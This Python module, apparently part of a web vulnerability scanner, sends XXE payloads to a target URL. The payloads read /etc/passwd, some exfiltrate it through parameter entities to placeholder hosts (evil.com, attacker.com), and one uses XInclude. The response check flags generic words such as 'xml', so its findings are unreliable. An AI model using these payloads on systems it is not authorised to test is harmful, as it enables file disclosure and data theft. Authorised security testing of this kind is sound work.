import httpx
import logging

class Module:
    def __init__(self, url, payload_engine, analyzer, verbose=False):
        self.url = url
        self.payload_engine = payload_engine
        self.analyzer = analyzer
        self.verbose = verbose
        self.findings = []

    async def run(self):
        # Test for XXE vulnerabilities
        await self.test_xxe_injection()
        return self.findings

    async def test_xxe_injection(self):
        # Test XXE payloads
        xxe_payloads = [
            # Basic XXE
            '''<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>''',
            
            # XXE with parameter entity
            '''<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://evil.com/?x=%file;'>">
%eval;
%exfil;
]>
<data>test</data>''',
            
            # XInclude
            '''<?xml version="1.0" encoding="ISO-8859-1"?>
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</foo>''',
            
            # Out-of-band XXE
            '''<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfil;
]>
<data>test</data>'''
        ]
        
        for payload in xxe_payloads:
            if await self.test_xxe(payload):
                self.findings.append({
                    'type': 'XML External Entity Injection',
                    'url': self.url,
                    'payload': payload[:100] + '...' if len(payload) > 100 else payload,
                    'risk': 'high',
                    'cwe': 'CWE-611',
                    'description': 'XXE vulnerability detected'
                })

    async def test_xxe(self, payload):
        # Test for XXE
        try:
            headers = {'Content-Type': 'application/xml'}
            async with httpx.AsyncClient(timeout=10) as client:
                resp = await client.post(self.url, data=payload, headers=headers)
                
                # Check for XXE indicators
                indicators = [
                    'root:x:',  # /etc/passwd content
                    'bin:',     # Unix paths
                    'usr:',     # Unix paths
                    'etc:',     # Unix paths
                    'xml',      # XML processing
                    'entity',   # Entity references
                    'doctype',  # DOCTYPE declarations
                    'include'   # XInclude
                ]
                
                for indicator in indicators:
                    if indicator in resp.text.lower():
                        return True
        except Exception:
            pass
        return False 